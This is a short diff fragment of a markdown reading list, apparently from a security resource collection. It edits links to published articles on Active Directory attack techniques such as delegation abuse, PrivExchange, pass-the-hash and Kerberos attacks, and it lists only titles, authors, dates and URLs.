-* [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
-* [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
 * [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+* [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
+* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
+* [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
